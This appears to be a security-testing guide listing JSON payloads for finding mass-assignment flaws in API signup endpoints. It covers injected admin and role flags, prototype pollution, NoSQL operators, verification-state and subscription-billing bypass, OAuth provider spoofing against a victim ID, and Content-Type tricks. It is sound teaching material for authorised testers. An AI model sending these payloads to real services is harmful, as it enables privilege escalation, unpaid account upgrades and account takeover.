## Introduction

Mass-assignment weaknesses show up frequently in modern APIs, especially in signup endpoints that accept JSON. When the backend automatically maps request fields to internal models without filtering them, attackers can slip in additional parameters and gain privileges they shouldn’t have. This guide walks through the most effective JSON payload variations you can use to test registration flows and uncover silent logic flaws.

## Why these bugs matter

Most frameworks deserialize JSON into objects automatically. If the server doesn’t enforce a strict allowlist of accepted fields, even a harmless-looking signup request can inject sensitive attributes like roles, admin flags, verification states or organization assignments. Understanding how different payload shapes behave is one of the most reliable ways to detect mass-assignment issues early.

## Practical JSON Payload Variants for Mass-Assignment Testing

Below are categorized payload examples you can use directly during testing. Each section includes a short explanation to help you understand what the variation is meant to uncover..

## Baseline payloads (different usernames and emails)

These are your initial “clean” requests. They help you confirm how the application handles uniqueness checks, email normalization, plus-addressing and subdomain-based emails. They act as a foundation before you start adding suspicious fields.

POST /api/v1/register  
{  
  "username":"probe_user_01",  
  "email":"probe01@example.com",  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"tester.jane",  
  "email":"jane.tester+1@example.com",  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"alpha_user",  
  "email":"alpha.user@sub.example.com",  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"bot_automation",  
  "email":"bot+signup@example.co.uk",  
  "password":"Password1!"  
}

## Boolean / admin flag attempts (case and type variants)

These payloads test whether the backend accepts privilege-related fields that should never be user-controlled. Changing casing, types or naming helps reveal loose parsing or inconsistent permission handling.

POST /api/v1/register  
{  
  "username":"probe_user_01",  
  "email":"probe01@example.com",  
  "isAdmin": true,  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"probe_user_01",  
  "email":"probe01@example.com",  
  "admin": "true",  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"probe_user_01",  
  "email":"probe01@example.com",  
  "ADMIN": 1,  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"probe_user_01",  
  "email":"probe01@example.com",  
  "is_admin": 1,  
  "password":"Password1!"  
}

## Role, privilege strings, and numeric flags

Some systems map roles by name or ID. Supplying role strings or IDs can reveal whether the application exposes privilege configuration through mass-assignment. This is a common escalation vector when internal role logic is loosely enforced.

POST /api/v1/register  
{  
  "username":"role_tester",  
  "email":"role.tester@example.com",  
  "role":"admin",  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"role_tester",  
  "email":"role.tester@example.com",  
  "role":"superuser",  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"role_tester",  
  "email":"role.tester@example.com",  
  "role_id":0,  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"role_tester",  
  "email":"role.tester@example.com",  
  "user_priv":"administrator",  
  "password":"Password1!"  
}

## Organization / tenant field variants

Multi-tenant applications often rely on IDs, slugs or organization names stored internally. If these fields are accessible during signup, an attacker might join restricted tenants or impersonate internal groups.

POST /api/v1/register  
{  
  "username":"org_probe",  
  "email":"org.probe@example.com",  
  "org":"CompanyA",  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"org_probe",  
  "email":"org.probe@example.com",  
  "organization_id":1,  
  "password":"Password1!"  
}  
  
POST /api/v1/register  
{  
  "username":"org_probe",  
  "email":"org.probe@example.com",  
  "org_slug":"internal-team",  
  "password":"Password1!"  
}

## Nested objects and prototype-style payloads

JSON-backed systems often merge nested objects into existing models. This can accidentally expose internal fields. Prototype pollution attempts such as __proto__ can affect JavaScript backends that don’t sanitize keys properly.

POST /api/v1/register  
{  
  "username":"nested_user",  
  "email":"nested.user@example.com",  
  "password":"Password1!",  
  "profile": {  
    "bio":"testing",  
    "visibility":"private"  
  }  
}  
  
POST /api/v1/register  
{  
  "username":"proto_user",  
  "email":"proto.user@example.com",  
  "password":"Password1!",  
  "__proto__": {"isAdmin": true}  
}

## Deeply nested and dot-notation keys

Some systems interpret dotted keys as nested objects. Others flatten nested objects into dot notation. These mismatches can unintentionally overwrite sensitive internal fields.

POST /api/v1/register  
{  
  "username":"deep_user",  
  "email":"deep.user@example.com",  
  "password":"Password1!",  
  "account": {  
    "meta": {  
      "role":"admin"  
    }  
  }  
}  
  
POST /api/v1/register  
{  
  "username":"deep_user",  
  "email":"deep.user@example.com",  
  "password":"Password1!",  
  "account.role":"admin"  
}

## Type confusion and mismatched data types

Different backends handle Boolean and null values differently. In some systems, “false” or 0 can still evaluate as truthy or trigger unexpected logic when coerced.

POST /api/v1/register  
{  
  "username":"type_user",  
  "email":"type.user@example.com",  
  "password":"Password1!",  
  "admin": "false"  
}  
  
POST /api/v1/register  
{  
  "username":"type_user",  
  "email":"type.user@example.com",  
  "password":"Password1!",  
  "admin": 0  
}  
  
POST /api/v1/register  
{  
  "username":"type_user",  
  "email":"type.user@example.com",  
  "password":"Password1!",  
  "admin": null  
}

## Arrays and list-based tampering

Some frameworks convert arrays into strings or only use the first element. This can expose unexpected parsing behavior or override fields using array-based privilege escalation.

POST /api/v1/register  
{  
  "username":["array_user"],  
  "email":["array.user@example.com"],  
  "password":["Password1!"]  
}  
  
POST /api/v1/register  
{  
  "username":"array_user",  
  "email":"array.user@example.com",  
  "password":"Password1!",  
  "roles":["user","admin"]  
}

## MongoDB / NoSQL operator payloads

If a server unintentionally passes JSON directly into a NoSQL query, operators like $ne or $gt can break filtering or bypass validation. This type of test must only be done in authorized environments.

POST /api/v1/register  
{  
  "username":"mongo_user",  
  "email":"mongo.user@example.com",  
  "password":"Password1!",  
  "isAdmin": {"$ne": null}  
}  
  
POST /api/v1/register  
{  
  "username":{"$gt": ""},  
  "email":"injection@example.com",  
  "password":"Password1!"  
}

## Parameter aliases, synonyms, and name variants

Some systems accept multiple aliases for admin-related fields. Sending variations helps identify whether the backend uses loose key matching or legacy field mappings.

POST /api/v1/register  
{  
  "username":"alias_user",  
  "email":"alias.user@example.com",  
  "password":"Password1!",  
  "is_superuser": true  
}  
  
POST /api/v1/register  
{  
  "username":"alias_user",  
  "email":"alias.user@example.com",  
  "password":"Password1!",  
  "super_user": true  
}  
  
POST /api/v1/register  
{  
  "username":"alias_user",  
  "email":"alias.user@example.com",  
  "password":"Password1!",  
  "staff": true  
}

## Verification and timestamp manipulation

Some APIs store verification flags directly from the request. Attackers may exploit these fields to mark their own email as verified or disable expiry validation.

POST /api/v1/register  
{  
  "username":"verify_user",  
  "email":"verify.user@example.com",  
  "password":"Password1!",  
  "email_verified": true  
}  
  
POST /api/v1/register  
{  
  "username":"verify_user",  
  "email":"verify.user@example.com",  
  "password":"Password1!",  
  "verification_expires":"1970-01-01T00:00:00Z"  
}

## Metadata and opaque JSON fields

Many systems allow metadata fields for logging or tracking purposes. If not properly filtered, attackers can overwrite internal metadata or inject privilege hints.

POST /api/v1/register  
{  
  "username":"meta_user",  
  "email":"meta.user@example.com",  
  "password":"Password1!",  
  "metadata": {  
    "internal_role":"admin",  
    "created_by":"script"  
  }  
}

## Encoding and content-type tricks

Some APIs trust the Content-Type header too much. If the backend has fallback parsers, sending the same JSON with a different or misleading content type can trigger unexpected parsing logic. That can open the door to weaker validation or alternate code paths the developers didn’t intend to expose.

POST /api/v1/register  
Content-Type: text/plain  
  
{  
  "username": "ct_user",  
  "email": "ct.user@example.com",  
  "password": "Password1!",  
  "isAdmin": true  
}

Even though the header says text/plain, some frameworks still try to parse it as JSON. If the validation for “non-JSON” requests is weaker, attackers can slip in fields like isAdmin without being filtered. And even send **no Content-Type header at all** to see what the server does.

### You can also try:

Content-Type: application/x-www-form-urlencoded  
Content-Type: application/xml  
Content-Type: */*  
Content-Type: application/json; charset=garbage  
Content-Type: application/json; boundary=--  
Content-Type: application/json; x=1

## String-encoded JSON fields

Some APIs try to parse strings that look like JSON. This is a common oversight when fields are stored in schemaless or flexible models.

POST /api/v1/register  
{  
  "username":"string_json",  
  "email":"string.json@example.com",  
  "password":"Password1!",  
  "profile":"{\"isAdmin\":true}"  
}

## Large / repeated fields

Oversized payloads help identify length limits, truncation or failure modes in the signup flow. They’re also useful for discovering unexpected storage behavior.

POST /api/v1/register  
{  
  "username":"long_user",  
  "email":"long.user@example.com",  
  "password":"Password1!",  
  "bio":"AAAAAA... (very long string)"  
}

## Subscription & Billing Bypass

This is often overlooked. In SaaS applications, user models frequently store subscription data. If you can manipulate these fields during signup, you might trick the system into giving you a “Pro” or “Enterprise” account without paying anything.

POST /api/v1/register  
{  
  "username": "freeloader",  
  "email": "free@example.com",  
  "plan": "pro",  
  "password": "Password1!"  
}  
  
POST /api/v1/register  
{  
  "username": "freeloader",  
  "email": "free@example.com",  
  "subscription_id": 9999,  
  "password": "Password1!"  
}  
  
POST /api/v1/register  
{  
  "username": "freeloader",  
  "email": "free@example.com",  
  "is_premium": true,  
  "password": "Password1!"  
}  
  
POST /api/v1/register  
{  
  "username": "freeloader",  
  "email": "free@example.com",  
  "trial_ends_at": "2050-01-01T00:00:00Z",  
  "password": "Password1!"  
}

## Workflow State Jumping

User accounts often go through “states” — e.g., pending, active, suspended, or banned. If the backend logic relies on the user model to track this state, you can try to force your account directly into an “active” state, bypassing email verification or approval queues

POST /api/v1/register  
{  
  "username": "status_jumper",  
  "email": "jump@example.com",  
  "status": "active",  
  "password": "Password1!"  
}  
  
POST /api/v1/register  
{  
  "username": "status_jumper",  
  "email": "jump@example.com",  
  "state": "verified",  
  "password": "Password1!"  
}  
  
POST /api/v1/register  
{  
  "username": "status_jumper",  
  "email": "jump@example.com",  
  "email_verified": true,  
  "password": "Password1!"  
}

## OAuth & Provider Spoofing

If the application supports “Sign in with Google/Facebook,” the user model likely stores a provider ID. If you register via the normal form but inject OAuth fields, you might trick the system into linking your password-based account to a legitimate admin’s social identity (if the validation logic is flawed).

POST /api/v1/register  
{  
  "username": "oauth_spoof",  
  "email": "spoof@example.com",  
  "provider": "google",  
  "provider_id": "100234234234...", // ID of a victim  
  "password": "Password1!"  
}  
  
POST /api/v1/register  
{  
  "username": "oauth_spoof",  
  "email": "spoof@example.com",  
  "auth_strategy": "ldap",  
  "password": "Password1!"  
}

## Combination payload (high-value finding)

Mixing multiple techniques is one of the most effective ways to find real vulnerabilities. Some combinations bypass incomplete validation or trigger multiple deserialization paths at once.

POST /api/v1/register  
{  
  "username":"combo_user",  
  "email":"combo.user+test@example.com",  
  "password":"Password1!",  
  "__proto__": {"isAdmin": true},  
  "profile": {"role":"admin"},  
  "metadata": "{\"elevate\":true}"  
}

## Conclusion

Mass-assignment bugs occur when backends trust incoming JSON too much. A harmless-looking signup request can overwrite sensitive fields if filtering isn’t strict. Testing the payload variations above helps reveal how the API handles different structures and types. Once these gaps are found, enforcing allowlists and validating each field becomes straightforward. Securing the signup flow strengthens the entire application.
